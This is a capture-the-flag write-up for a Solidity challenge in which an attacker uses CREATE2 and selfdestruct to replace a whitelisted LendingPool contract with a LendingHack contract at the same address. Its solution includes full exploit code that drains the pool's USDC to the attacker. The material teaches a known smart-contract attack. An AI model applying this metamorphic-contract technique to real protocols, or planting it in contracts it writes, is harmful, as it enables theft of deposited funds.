# LendingPool

## Challenge

This challenge focuses on the understanding of the CREATE2 and selfdestruct() opcodes in solidity.

It includes a few contracts which essentially can be separated in 2 categories:
- Protocol Contracts
- Attacker Contracts

### Protocol Contracts

#### LendingPool.sol

This contract is pretty much a vault in which you can deposit USDC and withdraw them later

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {USDC} from "./USDC.sol";

/**
 * @title LendingPool
 */
contract LendingPool is Ownable {
    mapping(address => uint256) public balances;
    USDC public usdc;
    string public constant name = "LendingPool V1";

    event Deposit(address account, uint256 amount);
    event Withdraw(address account, uint256 amount);

    /**
     * @dev Constructor that sets the owner of the contract
     * @param _owner The address of the owner of the contract
     * @param _usdc The address of the USDC contract to use
     */
    constructor(address _owner, address _usdc) {
        _transferOwnership(_owner);
        usdc = USDC(_usdc);
    }

    /**
     * @dev Deposit USDC into the LendingPool
     * @param _amount The amount of USDC to deposit
     */
    function deposit(uint256 _amount) public {
        address _owner = msg.sender;

        require(_amount > 0, "Deposit amount must be greater than zero");

        balances[_owner] += _amount;
        usdc.transferFrom(_owner, address(this), _amount);

        emit Deposit(_owner, _amount);
    }

    /**
     * @dev Withdraw USDC from the LendingPool
     * @param _amount The amount of USDC to withdraw
     */
    function withdraw(uint256 _amount) public {
        address _owner = msg.sender;

        require(_amount > 0, "Withdrawal amount must be greater than zero");
        require(balances[_owner] >= _amount, "Insufficient balance");

        balances[_owner] -= _amount;
        usdc.transfer(_owner, _amount);

        emit Withdraw(_owner, _amount);
    }

    /**
     * @dev Returns the balance of the given account
     * @param _account The address of the account to check
     * @return The balance of the account
     */
    function getBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }

    /**
     * @dev Stops the pool from functioning
     */
    function emergencyStop() public onlyOwner {
        selfdestruct(payable(0));
    }
}
```

#### LendExGovernor.sol

This contract takes care of adding LendingPool contracts to the trusted ones and removing them.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {USDC} from "./USDC.sol";

/**
 * @title IPool
 * @dev IPool is an interface for interacting with lending pool contracts
 */
interface IPool {
    function name() external view returns (string memory);
    function deposit() external;
    function withdraw(uint256 _amount) external;
    function getBalance(address _account) external view returns (uint256);
    function emergencyStop() external;
}

/**
 * @title LendExGovernor
 */
contract LendExGovernor is Ownable {

    mapping(address => bool) public acceptedContracts;
    USDC public usdc;

    event ContractAdded(address contractAddress);
    event ContractRemoved(address contractAddress);

    /**
     * @param _usdc The address of the USDC contract to use
     */
    constructor(address _usdc) {
        _transferOwnership(msg.sender);
        usdc = USDC(_usdc);
    }

    /**
     * @param _contractAddress The address of the contract to check
     */
    modifier onlyValidAddress(address _contractAddress) {
        require(acceptedContracts[_contractAddress], "Contract address is not currently accepted");
        _;
    }

    /**
     * @dev Adds a contract address to the whitelist
     * @param _contractAddress The address of the contract to add to the whitelist
     */
    function addContract(address _contractAddress) public onlyOwner {
        require(!acceptedContracts[_contractAddress], "Contract address is already accepted");
        acceptedContracts[_contractAddress] = true;

        emit ContractAdded(_contractAddress);
    }

    /**
     * @dev Removes a contract address from the whitelist
     * @param _contractAddress The address of the contract to remove from the whitelist
     */
    function removeContract(address _contractAddress) public onlyOwner {
        require(acceptedContracts[_contractAddress], "Contract address is not currently accepted");
        acceptedContracts[_contractAddress] = false;

        emit ContractRemoved(_contractAddress);
    }

    /**
     * @dev Returns the name of a pool
     * @param _contractAddress The address of the pool contract
     * @return The name of the pool
     */
    function getPoolName(address _contractAddress)
        public
        view
        onlyValidAddress(_contractAddress)
        returns (string memory)
    {
        return IPool(_contractAddress).name();
    }

    /**
     * @dev Deposits funds into a pool
     * @param _contractAddress The address of the pool contract
     * @param _amount The amount of funds to deposit
     */
    function fundLendingPool(address _contractAddress, uint256 _amount)
        public
        onlyOwner
        onlyValidAddress(_contractAddress)
    {
        usdc.transfer(_contractAddress, _amount);
    }

    /**
     * @dev withdraws funds from a pool
     * @param _contractAddress The address of the pool contract
     * @param _amount The amount of funds to withdraw
     */
    function withdrawFromLendingPool(address _contractAddress, uint256 _amount)
        public
        onlyOwner
        onlyValidAddress(_contractAddress)
    {
        IPool(_contractAddress).withdraw(_amount);
    }
}
```

### Attacker Contracts

#### Create2Deployer

This contract makes use of the CREATE2 opcode and deploys a Createdeployer contract to a fixed address (can't be chosen but will always be the same when deploy() is called). 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {CreateDeployer} from "./CreateDeployer.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Create2Deployer
 */
contract Create2Deployer is Ownable {
    /**
     * @dev Constructor that sets the owner of the contract as the deployer
     */
    constructor() {
        _transferOwnership(msg.sender);
    }

    /**
     * @dev Deploys a CreateDeployer contract using the CREATE2 opcode
     */
    function deploy() external returns (address) {
        bytes32 salt = keccak256(abi.encode(uint256(1)));
        return address(new CreateDeployer{salt: salt}(owner()));
    }
}
```

#### CreateDeployer

This contract is used for either deploying LendingPool or LendingHack contracts. As there is no salt used, the contracts will be deployed at different addresses each time deploy() is called.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {LendingPool} from "./LendingPool.sol";
import {LendingHack} from "./LendingHack.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title CreateDeployer
 */
contract CreateDeployer is Ownable {

    /**
     * @dev Constructor that sets the owner of the contract
     * @param _owner The address of the owner of the contract
     */
    constructor(address _owner) {
        _transferOwnership(_owner);
    }

    /**
     * @dev Deploys a LendingPool or LendingHack contract
     * @param deployPool Whether to deploy a LendingPool or LendingHack contract
     * @param _usdc The address of the USDC contract to use for the LendingPool or LendingHack contracts
     */
    function deploy(bool deployPool, address _usdc) public onlyOwner returns (address contractAddress) {
        if (deployPool) {
            contractAddress = address(new LendingPool(owner(), _usdc));
        } else {
            contractAddress = address(new LendingHack(owner(), _usdc));
        }
    }


    function cleanUp() public onlyOwner {
        selfdestruct(payable(address(0)));
    }
}
```

Challenge Description:

In the realm of decentralized finance, where trust is often bestowed upon code, a groundbreaking borrowing and lending platform known as LendEx was created.

Unbeknownst to the LendEx team, a hacker hide a bug in the LendingPool smart contract with a intention to exploit the bug later. LendEx team reviewed smart contract source code, approved it for the usage and deposited the funds from the LendExGovernor contract to the LendingPool contract.

Do you have what it takes to spot how hacker is planning to exploit the LendEx?

📌 You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool.  
📌 Note: Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract.
📌 You have to modify LendingHack.sol and setUp(), testExploit() functions for Challenge3.t.sol.

## Solution

The attacker can use the create2 and selfdestruct() functionalities to switch out contracts under the owner's nose. As the contracts also hold ERC-20s instead of eth, nothing gets burned in the selfdestruct(). The attack takes a few steps.

1. Selfdestruct createDeployer and lendingPool to make their spots free again(otherwise a revert would be triggered)
2. Recreate createDeployer (will be deployed to the same spot as salt is always the same), his nonce will also be reset to 0
3. Use createDeployer to deploy the LendingHack instead of the lendingPool
4. LendingHack will be deployed at the address lendingPool was at before as the nonce of createDeployer is 0 again.
5. Transfer all the USDC to yourself
6. Change the name & storage of the LendingHack beforehand, so the testcase passes

So I started by writing my LendingHack contract, which was pretty easy as it only needed the same storage layout as lendingPool as well as the function to send all its USDC to the attacker in its constructor.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {USDC} from "./USDC.sol";

/**
 * @title LendingPool
 */
contract LendingHack is Ownable {
    /*//////////////////////////////
    //    Add your hack below!    //
    //////////////////////////////*/
    mapping(address => uint256) public balances;
    USDC public usdc;
    string public constant name = "LendingPool hack";

    /**
     * @dev Constructor that sets the owner of the contract
     * @param _usdc The address of the USDC contract to use
     * @param _owner The address of the owner of the contract
     */
    constructor(address _owner, address _usdc) {
        // change me pls :)
        _transferOwnership(_owner);
        usdc = USDC(_usdc);
        usdc.transfer(_owner, usdc.balanceOf(address(this)));
    }

    //============================//
}
```

Now I just needed to do the other steps, which can be done by 2 calls in the setUp() as well as 2 calls in the normal testcase, which need to be split because of the foundry bug.

in setUp():
```solidity
lendingPool.emergencyStop();
createDeployer.cleanUp();
```

in testExploit():
```solidity
createDeployer = CreateDeployer(create2Deployer.deploy());
LendingHack hack = LendingHack(createDeployer.deploy(false, address(usdc)));
```
